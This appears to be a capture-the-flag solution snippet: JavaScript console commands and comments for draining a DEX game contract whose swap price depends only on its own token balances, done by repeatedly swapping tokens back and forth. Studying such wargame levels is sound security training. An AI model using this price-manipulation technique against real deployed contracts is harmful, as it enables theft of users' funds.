/*

This example has a contract that decodes the swap value between two tokens based on the quantity of those 2 tokens in this contract

This swap price can be easily manipulated by changing the values of these ERC20 tokens in this contract

This example does not require deploying a solidity code the dex can be hacked from the console itself

*/

// Get the current balanes of your player
await contract.balanceOf(token2,player).then(x=>x.toNumber())
await contract.balanceOf(token1,player).then(x=>x.toNumber())

// You will get swap price between tokens
await contract.getSwapPrice(token1,token2,amount)

// Start with any token and keep swapping the token you have the most to the token you have the least
// Keep repeating till one of them reaches 110 as this is the total number of tokens of any type in the entire ecosystem
contract.swap(token1,token2,10)
contract.swap(token2,token1,20)
//...and so on
